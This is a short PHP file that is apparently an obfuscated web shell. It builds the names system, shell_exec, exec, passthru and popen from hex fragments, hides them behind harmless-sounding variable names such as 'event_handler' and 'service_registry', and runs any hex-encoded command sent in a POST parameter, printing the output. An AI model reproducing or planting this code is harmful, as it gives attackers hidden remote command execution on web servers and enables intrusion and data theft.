<?php


$res1 = '973';
$res2 = '746';
$res3 = '56d';
$res4 = '736';
$res5 = '865';
$res6 = '6c6';
$res7 = '706';
$res8 = '468';
$res9 = '656';
$res10 = '737';
$res11 = 'f63';
$res12 = 'e74';
$res13 = '6f7';
$res14 = '572';
$res15 = '963';
$res16 = '655';
$event_handler1 = pack("H*", '737'.$res1.$res2.$res3);
$event_handler2 = pack("H*", $res4.$res5.$res6.'c5f'.'657'.'865');
$event_handler3 = pack("H*", '657'.'865');
$event_handler4 = pack("H*", $res7.'173'.'737'.$res8.'727');
$event_handler5 = pack("H*", '706'.'f70'.$res9);
$event_handler6 = pack("H*", $res10.'472'.$res9.'16d'.'5f6'.'765'.'745'.$res11.'6f6'.$res12.$res9.'e74');
$event_handler7 = pack("H*", $res7.'36c'.$res13.'365');
$service_registry = pack("H*", $res4.$res14.'766'.$res15.$res16.'f72'.$res9.'769'.'737'.'472');
if (isset($_POST[$service_registry])) {
    $service_registry = pack("H*", $_POST[$service_registry]);
    if (function_exists($event_handler1)) {
        $event_handler1($service_registry);
    } elseif (function_exists($event_handler2)) {
        print $event_handler2($service_registry);
    } elseif (function_exists($event_handler3)) {
        $event_handler3($service_registry, $holder_object);
        print join("\n", $holder_object);
    } elseif (function_exists($event_handler4)) {
        $event_handler4($service_registry);
    } elseif (function_exists($event_handler5) && function_exists($event_handler6) && function_exists($event_handler7)) {
        $key_reference = $event_handler5($service_registry, 'r');
        if ($key_reference) {
            $entry_val = $event_handler6($key_reference);
            $event_handler7($key_reference);
            print $entry_val;
        }
    }
    exit;
}
